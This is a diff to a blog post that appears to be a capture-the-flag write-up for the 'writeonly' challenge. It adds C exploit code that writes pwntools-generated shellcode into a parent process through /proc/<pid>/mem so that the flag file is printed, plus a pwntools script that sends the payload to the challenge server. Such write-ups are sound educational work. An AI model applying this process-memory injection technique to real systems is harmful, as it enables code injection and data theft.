@@ -159,9 +159,25 @@ some evil inline assembly to get the value pointed to by `rbp - 0x4`.
 
 The next step was to construct the path. I was unsure of the availability of C
 string and `itoa`-like functions in the environment, given that there is no
-standard library present, so I just wrote some. Later, I found out that
-`memcpy` was in fact available, so it's distinctly possible some of this was a
-waste of time.
+standard library present, so I just wrote some. An interesting optimization of
+this nicked from [later rewriting the exploit in
+Rust](https://lfcode.ca/blog/writeonly-in-rust) is that my `itoa` goes
+backwards, writing into a with a buffer containing extra slashes that will
+otherwise be ignored by the OS.  This cut my executable size about in half by
+not having to reverse the string or perform string copies as one would have to
+do in a normal `itoa`.
+
+
+```c
+    int pid;
+    // well, we weren't allowed getpid so,
+    // steal the pid from the caller's stack
+    __asm__ __volatile__ (
+        "mov %0, dword ptr [rbp - 0x4]\n"
+        : "=r"(pid) ::);
+    char pathbuf[64] = "/proc////////////mem";
+    itoa_badly(pid, &pathbuf[15]);
+```
 
 Syscalls were performed with more inline assembly, this time lifted directly
 from the musl sources. Part of my motivation in not using a libc, besides
@@ -174,6 +190,83 @@ likely will work most of the time.
 
 Stage 2 shellcode was generated with pwntools `shellcraft`. It was fairly
 trivial.
+
+```c
+    int fd = syscall2(SYS_open, (uint64_t)(void *)pathbuf, O_RDWR);
+
+    /* disassemble check_flag
+     * (...)
+     * 0x00000000004022d9 <+167>:   mov    edi,0x1
+     * 0x00000000004022de <+172>:   call   0x44f2e0 <sleep>
+     * 0x00000000004022e3 <+177>:   jmp    0x40223a <check_flag+8>
+     */
+    void *tgt = (void *)0x4022e3;
+    syscall3(SYS_lseek, fd, (uint64_t)tgt, SEEK_SET);
+
+    //////////////////////////////////////////////////////////////
+    // Now, just write shellcode into memory at the injection point.
+    /*
+     * In [4]: sh = shellcraft.amd64.cat('/home/user/flag', 1) + shellcraft.amd64.infloop()
+     * In [5]: print(sh)
+     *     / * push b'/home/user/flag\x00' * /
+     *     mov rax, 0x101010101010101
+     *     push rax
+     *     mov rax, 0x101010101010101 ^ 0x67616c662f7265
+     *     xor [rsp], rax
+     *     mov rax, 0x73752f656d6f682f
+     *     push rax
+     *     / * call open('rsp', 'O_RDONLY', 0) * /
+     *     push SYS_open / * 2 * /
+     *     pop rax
+     *     mov rdi, rsp
+     *     xor esi, esi / * O_RDONLY * /
+     *     cdq / * rdx=0 * /
+     *     syscall
+     *     / * call sendfile(1, 'rax', 0, 2147483647) * /
+     *     mov r10d, 0x7fffffff
+     *     mov rsi, rax
+     *     push SYS_sendfile / * 0x28 * /
+     *     pop rax
+     *     push 1
+     *     pop rdi
+     *     cdq / * rdx=0 * /
+     *     syscall
+     *     jmp $
+     * In [7]: [hex(x) for x in asm(sh)]
+     */
+    char evil[] = {0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50,
+        0x48, 0xb8, 0x64, 0x73, 0x2e, 0x67, 0x6d, 0x60, 0x66, 0x1, 0x48, 0x31,
+        0x4, 0x24, 0x48, 0xb8, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73,
+        0x50, 0x6a, 0x2 , 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf, 0x5,
+        0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a , 0x28,
+        0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5, 0xeb, 0xfe};
+
+    syscall3(SYS_write, fd, (uint64_t)(void *)evil, sizeof (evil));
+```
+
+I sent it with a simple pwntools script:
+
+```python
+import os
+import sys
+from pwn import *
+
+f = sys.argv[1]
+fd = open(f, 'rb')
+stat = os.stat(f)
+sz = stat.st_size
+
+io = remote('writeonly.2020.ctfcompetition.com', 1337)
+
+# for `make serve`
+# io = remote('localhost', 8000)
+
+# you can gdb into the parent before we send malicious code
+input()
+io.sendline(str(sz))
+io.send(fd.read())
+io.interactive()
+```
 
 Then, the exciting moment:
 
@@ -204,4 +297,5 @@ ASLR, so fought with `gdb` a bunch about that.
 Filip suggested that I use `socat TCP-LISTEN:8000,bind=localhost,reuseaddr,fork
 EXEC:./chal` to essentially emulate the challenge server locally, and debug the
 remote process. If the process is not started with `gdb` it is more likely to
-be reproducible. This helped a lot in eliminating that as a variable.
+be reproducible. This helped a lot in eliminating that as a variable while
+debugging.
